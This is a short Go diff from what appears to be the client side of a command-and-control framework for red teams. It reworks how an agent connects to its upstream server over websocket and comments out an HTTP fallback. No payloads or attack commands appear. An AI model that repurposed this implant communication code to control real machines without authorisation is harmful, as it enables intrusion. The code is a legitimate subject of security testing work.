@@ -6,7 +6,6 @@ import (
 	"github.com/dobin/antnium/pkg/arch"
 	"github.com/dobin/antnium/pkg/campaign"
 	"github.com/dobin/antnium/pkg/model"
-	log "github.com/sirupsen/logrus"
 )
 
 /*
@@ -52,7 +51,7 @@ func (d *UpstreamManager) Connect() error {
 	if err != nil {
 		return err
 	}
-	go d.upstreamWs.Start()
+	d.upstreamWs.Start()
 	d.sendPing()
 
 	var packet model.Packet
@@ -61,10 +60,27 @@ func (d *UpstreamManager) Connect() error {
 		d.channel <- packet
 
 		packet = <-d.channel
-		d.SendOutofband(packet)
+		d.upstreamWs.OobChannel() <- packet
 	}()
 
+	/**
 	// Try: HTTP
+	err := d.upstreamHttp.Connect()
+	if err != nil {
+		return err
+	}
+	d.upstreamHttp.Start()
+	d.sendPing()
+
+	var packet model.Packet
+	go func() {
+		packet = <-d.upstreamHttp.Channel()
+		d.channel <- packet
+
+		packet = <-d.channel
+		d.SendOutofband(packet)
+	}()
+	**/
 
 	// Wait
 
@@ -72,13 +88,14 @@ func (d *UpstreamManager) Connect() error {
 }
 
 func (d *UpstreamManager) SendOutofband(packet model.Packet) error {
-	log.Info("OOB")
-
+	/**
 	return d.upstreamHttp.SendOutofband(packet)
-}
+	**/
 
-// go c.Upstream.Start()
-//go c.sendPing() // Thread: sendPing
+	d.upstreamWs.OobChannel() <- packet
+
+	return nil
+}
 
 func (d *UpstreamManager) sendPing() {
 	arguments := make(model.PacketArgument)
